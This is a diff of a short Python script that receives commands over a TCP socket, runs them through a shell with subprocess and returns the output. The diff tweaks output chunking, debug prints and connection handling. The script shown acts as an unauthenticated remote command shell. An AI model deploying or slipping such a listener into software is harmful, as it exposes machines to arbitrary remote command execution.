@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import time
 
 def receive_data():
     tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -17,22 +18,21 @@ def receive_data():
 
             result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
 
-            print(result)
-            result = result.decode() + "EOD"
-            result = result.encode()
+            # print(result)
+            # result = result.decode() + "EOD"
+            # result = result.encode()
+            # Denote end of buffer
+            result += b'\x00'
 
-            chunk_size = 1024
+            chunk_size = 1500
             bytes_sent = 0
+            print("Size of data:", len(result))
             for i in range(0, len(result), chunk_size):
                 chunk = result[i:i + chunk_size]
-                bytes_sent += client_socket.send(chunk)
-                print("Bytes sent:", bytes_sent)
-            print("Size of data:", len(chunk))
+                bytes_sent += client_socket.send(chunk) 
             print("Size of sent bytes:", bytes_sent)
         except Exception as e:
             print(f"Error: {str(e)}")
-        finally:
-            client_socket.close()
 
 if __name__ == "__main__":
-    receive_data()
+    receive_data()  
